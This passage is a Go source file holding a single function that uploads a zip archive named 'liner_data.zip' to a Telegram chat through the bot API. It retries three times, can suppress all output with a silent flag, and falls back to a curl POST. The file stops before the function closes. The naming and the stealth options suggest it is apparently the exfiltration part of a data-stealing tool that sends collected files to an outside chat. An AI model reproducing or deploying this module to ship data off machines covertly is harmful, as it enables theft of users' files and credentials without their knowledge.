package core

import (
	"fmt"
	"os"
	"os/exec"
	"strconv"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

// SendToTelegram sends the zipped data to the specified Telegram chat
func SendToTelegram(token, chatID, filePath string, silent bool) error {
	// Try sending with Telegram Bot API (3 retries)
	for attempt := 1; attempt <= 3; attempt++ {
		bot, err := tgbotapi.NewBotAPI(token)
		if err == nil {
			chatIDInt, err := strconv.ParseInt(chatID, 10, 64)
			if err != nil {
				return fmt.Errorf("invalid chat ID: %v", err)
			}

			file, err := os.Open(filePath)
			if err != nil {
				return fmt.Errorf("failed to open file: %v", err)
			}
			defer file.Close()

			doc := tgbotapi.NewDocument(chatIDInt, tgbotapi.FileReader{
				Name:   "liner_data.zip",
				Reader: file,
			})
			_, err = bot.Send(doc)
			if err == nil {
				if !silent {
					fmt.Println("Data successfully sent to Telegram")
				}
				return nil
			}
			if !silent {
				fmt.Printf("Attempt %d failed: %v\n", attempt, err)
			}
		}
	}

	// Fallback to curl
	cmd := exec.Command("curl", "-s", "-X", "POST",
		fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", token),
		"-F", fmt.Sprintf("chat_id=%s", chatID),
		"-F", fmt.Sprintf("document=@%s", filePath))
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to send file with curl: %v", err)
	}

	if !silent {
		fmt.Println("Data sent to Telegram via curl")
	}
	return nil
